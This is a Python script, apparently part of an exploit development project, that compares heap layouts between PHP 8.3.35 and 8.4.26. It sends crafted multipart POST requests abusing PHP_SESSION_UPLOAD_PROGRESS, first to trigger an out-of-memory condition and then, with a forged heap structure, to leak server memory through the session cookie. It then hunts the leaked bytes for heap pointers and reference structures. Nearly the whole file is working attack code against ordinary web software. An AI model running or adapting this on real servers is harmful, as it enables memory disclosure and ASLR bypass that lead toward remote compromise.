"""Compare the heap layout between 8.3.35 and 8.4.26 to understand the difference.
The key question: where is the reference at PS(http_session_vars) on each version?
"""
import sys, os, struct, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

def leak(port, label):
    """Do a full leak on the given port and return the cookie data."""
    URL = f"http://127.0.0.1:{port}/"
    t = E.Target(URL, timeout=180.0, verbose=False)

    # Stage 1: OOM trigger
    print(f"  [{label}] Stage 1: OOM trigger (256MB)...", flush=True)
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
    ]
    parts.append({"name": "big", "data": b"B" * int(256 * 1024 * 1024)})
    try:
        r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=180)
    except Exception as e:
        print(f"    REQUEST1 ERROR: {e}", flush=True)
        return None
    time.sleep(0.5)

    # Stage 2: leak
    print(f"  [{label}] Stage 2: leak...", flush=True)
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(841):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    try:
        r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=180)
        raw = E.parse_cookie(r2)
        print(f"    Cookie: {len(raw)}B", flush=True)
        return raw
    except Exception as e:
        print(f"    REQUEST2 ERROR: {e}", flush=True)
        return None

print("=== Comparing 8.3.35 vs 8.4.26 ===", flush=True)

# Leak on 8.3.35
raw_8335 = leak(18112, "8.3.35")
time.sleep(2)

# Leak on 8.4.26 (control)
raw_8426 = leak(18113, "8.4.26")

if raw_8335 is None or raw_8426 is None:
    print("[-] Failed to leak on one or both versions", flush=True)
    sys.exit(1)

# Analyze both
for label, raw in [("8.3.35", raw_8335), ("8.4.26", raw_8426)]:
    print(f"\n--- {label} ---", flush=True)

    # Find chunk base
    c = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    chunk = c.most_common(1)[0][0] if c else 0
    print(f"  Chunk base: 0x{chunk:x}", flush=True)

    # Find all pointers in the cookie
    pointers = []
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            pointers.append((i, v))

    print(f"  Total pointers: {len(pointers)}", flush=True)

    # Show the first 10 pointers
    print(f"  First 10 pointers:", flush=True)
    for i, v in pointers[:10]:
        offset_from_chunk = v - chunk
        print(f"    offset {i:04x}: 0x{v:x} (chunk+0x{offset_from_chunk:x})", flush=True)

    # Look for the reference pattern (rc=1, typ=0x1A)
    print(f"  Searching for reference pattern (rc=1, typ=0x1A)...", flush=True)
    pattern = struct.pack("<II", 1, 0x1A)
    idx = 0
    found = 0
    while True:
        idx = raw.find(pattern, idx)
        if idx == -1:
            break
        if idx + 16 <= len(raw):
            val = int.from_bytes(raw[idx+8:idx+16], "little")
            print(f"    Found at offset {idx:04x}: rc=1, typ=0x1A, val.value=0x{val:x}", flush=True)
            found += 1
        idx += 1
    if found == 0:
        print("    No references found", flush=True)

print("\n=== done ===", flush=True)
